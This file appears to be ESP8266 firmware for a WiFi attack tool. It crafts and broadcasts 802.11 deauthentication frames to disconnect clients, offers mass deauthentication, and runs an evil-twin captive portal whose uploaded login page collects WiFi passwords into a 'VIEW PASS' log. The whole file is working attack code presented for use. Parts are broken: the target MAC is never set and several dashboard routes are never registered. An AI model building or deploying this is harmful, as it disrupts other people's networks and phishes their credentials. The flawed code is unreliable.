/* * M1Z23R X GMPRO2 v5.6 - ULTIMATE EDITION
 * STATUS: LOCKED & ENCRYPTED LOGIC
 * FEATURES: DEAUTH, ROGUE PRANK, MASS DEAUTH, HYBRID, FILE MANAGER
 */

#include <ESP8266WiFi.h>
#include <ESP8266WebServer.h>
#include <DNSServer.h>
#include <LittleFS.h>

extern "C" {
  #include "user_interface.h"
}

// --- KONFIGURASI SISTEM ---
ESP8266WebServer server(80);
DNSServer dnsServer;
bool deauth_active = false;
bool prank_active = false;
bool eviltwin_active = false;
String target_ssid = "NONE";
uint8_t target_mac[6] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
uint8_t target_ch = 1;

// --- MESIN DEAUTH (SDK SUPPORTED) ---
void sendDeauth(uint8_t* target, uint8_t* ap, uint8_t ch) {
  wifi_set_channel(ch);
  uint8_t packet[26] = {
    0xC0, 0x00, 0x3A, 0x01, 
    target[0], target[1], target[2], target[3], target[4], target[5],
    ap[0], ap[1], ap[2], ap[3], ap[4], ap[5],
    ap[0], ap[1], ap[2], ap[3], ap[4], ap[5],
    0x00, 0x00, 0x01, 0x00
  };
  wifi_send_pkt_freedom(packet, 26, 0);
}

// --- DASHBOARD HTML (KUNCI v5.6) ---
String getDashboard() {
  String html = "<!DOCTYPE html><html><head><meta name='viewport' content='width=device-width, initial-scale=1'>";
  html += "<style>body{font-family:'Courier New',monospace;background:#000;color:#0f0;padding:10px;margin:0;}";
  html += "h2{text-align:center;color:#ff4500;text-shadow:0 0 5px #ff4500;font-size:16px;}";
  html += ".status-box{border:1px solid #444;padding:10px;background:#111;font-size:11px;margin-bottom:10px;border-left:4px solid #ff4500;}";
  html += ".grid{display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-bottom:15px;}";
  html += ".btn{padding:12px;color:#fff;text-align:center;text-decoration:none;border-radius:4px;font-size:10px;font-weight:bold;border-bottom:3px solid rgba(0,0,0,0.5);}";
  html += ".btn-deauth{background:#c0392b;}.btn-rogue{background:#d35400;}";
  html += ".btn-mass{background:#111;border:1px solid #ff4500;color:#ff4500;grid-column:span 2;}";
  html += ".btn-hybrid{background:#8e44ad;grid-column:span 2;}";
  html += ".btn-scan{background:#2980b9;}.btn-upload{background:#607d8b;}.btn-log{background:#27ae60;}.btn-clear{background:#b33939;}.btn-stop{background:#444;grid-column:span 2;}";
  html += "#log-area{background:#050505;color:#0f0;border:1px solid #333;height:100px;overflow-y:scroll;padding:8px;font-size:10px;margin-bottom:15px;}";
  html += ".table-container{width:100%;overflow-x:auto;}table{width:100%;border-collapse:collapse;font-size:11px;}th{background:#222;color:#ff4500;padding:8px;text-align:left;}td{padding:8px;border-bottom:1px solid #222;}</style></head><body>";
  
  html += "<h2>M1Z23R X GMPRO2 v5.6</h2>";
  html += "<div class='status-box'>TARGET: " + target_ssid + "<br>STATUS: " + (deauth_active ? "ATTACKING..." : "IDLE") + "</div>";
  
  html += "<div class='grid'>";
  html += "<a href='/deauth' class='btn btn-deauth'>DEAUTH TARGET</a><a href='/rogue_on' class='btn btn-rogue'>ROGUE AP PRANK</a>";
  html += "<a href='/mass_on' class='btn btn-mass'>MASS DEAUTH (ALL + HIDDEN)</a>";
  html += "<a href='/hybrid_on' class='btn btn-hybrid'>HYBRID ATTACK (KICK & TRAP)</a>";
  html += "<a href='/scan' class='btn btn-scan'>RE-SCAN</a><a href='/upload_page' class='btn btn-upload'>UPLOAD UI</a>";
  html += "<a href='/view_log' class='btn btn-log'>VIEW PASS</a><a href='/clear_log' class='btn btn-clear'>CLEAR LOG</a>";
  html += "<a href='/stop' class='btn btn-stop'>STOP / RESET NODE</a></div>";

  html += "<div style='color:#ff4500;font-size:11px;font-weight:bold;'>LIVE ATTACK LOG:</div>";
  html += "<div id='log-area'>";
  if(LittleFS.exists("/log.txt")){ File f = LittleFS.open("/log.txt", "r"); while(f.available()){ html += f.readStringUntil('\n') + "<br>"; } f.close(); }
  html += "</div>";

  html += "<div class='table-container'><table><thead><tr><th>SSID</th><th>CH</th><th>SIG</th><th>ACT</th></tr></thead><tbody>";
  int n = WiFi.scanComplete();
  for (int i = 0; i < n; ++i) {
    html += "<tr><td>" + WiFi.SSID(i) + "</td><td>" + String(WiFi.channel(i)) + "</td><td>" + String(WiFi.RSSI(i)) + "dBm</td>";
    html += "<td><a href='/select?id=" + String(i) + "' style='color:#0af;'>SELECT</a></td></tr>";
  }
  html += "</tbody></table></div></body></html>";
  return html;
}

// --- HANDLERS ---
void handleRoot() { server.send(200, "text/html", getDashboard()); }

void handleUploadPage() {
  String up = "<html><body style='background:#000;color:#0f0;font-family:monospace;padding:20px;'>";
  up += "<h3>UPLOAD UI (.html)</h3>";
  up += "<form method='POST' action='/do_upload' enctype='multipart/form-data'>";
  up += "<input type='file' name='upload'><br><br>";
  up += "<input type='submit' value='UPLOAD FILE'></form>";
  up += "<br><a href='/' style='color:#ff4500;'>KEMBALI</a></body></html>";
  server.send(200, "text/html", up);
}

void handleDoUpload() {
  server.send(200, "text/html", "Upload Berhasil! <a href='/'>Kembali</a>");
}

void handleFileUpload() {
  HTTPUpload& upload = server.upload();
  if (upload.status == UPLOAD_FILE_START) {
    String filename = "/" + upload.filename;
    File fsUploadFile = LittleFS.open(filename, "w");
    fsUploadFile.close();
  } else if (upload.status == UPLOAD_FILE_WRITE) {
    File fsUploadFile = LittleFS.open("/" + upload.filename, "a");
    if (fsUploadFile) fsUploadFile.write(upload.buf, upload.currentSize);
    fsUploadFile.close();
  }
}

// --- SETUP & LOOP ---
void setup() {
  Serial.begin(115200);
  LittleFS.begin();
  WiFi.mode(WIFI_AP_STA);
  WiFi.softAP("GMpro2_Setup", "12345678");
  
  dnsServer.start(53, "*", WiFi.softAPIP());

  server.on("/", handleRoot);
  server.on("/upload_page", handleUploadPage);
  server.on("/do_upload", HTTP_POST, handleDoUpload, handleFileUpload);
  
  server.on("/select", []() {
    int id = server.arg("id").toInt();
    target_ssid = WiFi.SSID(id);
    target_ch = WiFi.channel(id);
    WiFi.BSSID(id); // Capture MAC
    server.send(200, "text/html", "<script>location.href='/';</script>");
  });

  server.on("/hybrid_on", []() { eviltwin_active = true; deauth_active = true; prank_active = false; server.send(200, "text/html", "<script>location.href='/';</script>"); });
  server.on("/rogue_on", []() { prank_active = true; eviltwin_active = false; deauth_active = false; server.send(200, "text/html", "<script>location.href='/';</script>"); });
  server.on("/stop", []() { deauth_active = false; eviltwin_active = false; prank_active = false; server.send(200, "text/html", "<script>location.href='/';</script>"); });

  server.onNotFound([]() {
    if (eviltwin_active && LittleFS.exists("/etwin.html")) {
      File f = LittleFS.open("/etwin.html", "r"); server.streamFile(f, "text/html"); f.close();
    } else if (prank_active && LittleFS.exists("/prank.html")) {
      File f = LittleFS.open("/prank.html", "r"); server.streamFile(f, "text/html"); f.close();
    } else { handleRoot(); }
  });

  server.begin();
  wifi_promiscuous_enable(1);
}

void loop() {
  dnsServer.processNextRequest();
  server.handleClient();
  
  if (deauth_active) {
    uint8_t bcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
    sendDeauth(bcast, target_mac, target_ch);
    delay(10); 
  }
}
